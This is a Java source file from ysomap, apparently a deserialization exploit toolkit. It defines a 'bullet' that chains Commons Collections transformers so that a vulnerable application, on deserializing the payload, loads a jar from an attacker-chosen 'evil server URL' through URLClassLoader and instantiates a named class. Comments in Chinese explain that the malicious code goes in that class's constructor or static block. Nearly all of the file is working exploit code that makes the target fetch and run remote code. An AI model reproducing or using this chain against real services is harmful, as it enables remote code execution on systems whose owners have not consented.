package ysomap.bullets.collections;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.net.URLClassLoader;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("执行后，向外部HTTP服务上挂载的jar文件进行载入")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithURLClassLoaderBullet extends AbstractTransformerBullet {

    @NotNull
    @Require(name = "jarUrl" ,detail = "evil server URL, like http://localhost:80/EvilObj.jar")
    public String jarUrl;

    @NotNull
    @Require(name="remoteObj", detail = "remote object name")
    public String remoteObj;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    /**
     * 利用URLClassLoader进行远程class或jar文件载入
     * 这里远程服务器挂载可以使用exploit里的xxx
     * @return transformers[]
     * @throws Exception err
     */
    @Override
    public Object getObject() throws Exception {
        initClazz(version);

        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(URLClassLoader.class));
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"newInstance", new Class[]{java.net.URL[].class} }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class },
                new Object[] {null, new Object[] {
                        new java.net.URL[] { new java.net.URL(jarUrl) }
                }})
        );
        transformers.add(createInvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { remoteObj }));
        // 这里需要载入后的类存在newInstance()函数 构造时把利用放在newInstance 或者 静态块上
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"newInstance", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class },
                new Object[] {null, new Object[]{}})
        );

        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerWithURLClassLoaderBullet();
        bullet.set("jarUrl", args[0]);
        bullet.set("remoteObj", args[1]);
        bullet.set("version", args[2]);
        return bullet;
    }
}
